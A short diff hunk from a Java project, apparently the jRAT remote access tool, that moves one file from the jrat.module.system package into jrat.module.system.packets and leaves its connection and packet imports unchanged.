@@ -1,4 +1,4 @@
-package jrat.module.system;
+package jrat.module.system.packets;
 
 import jrat.client.Connection;
 import jrat.client.packets.incoming.IncomingPacket;
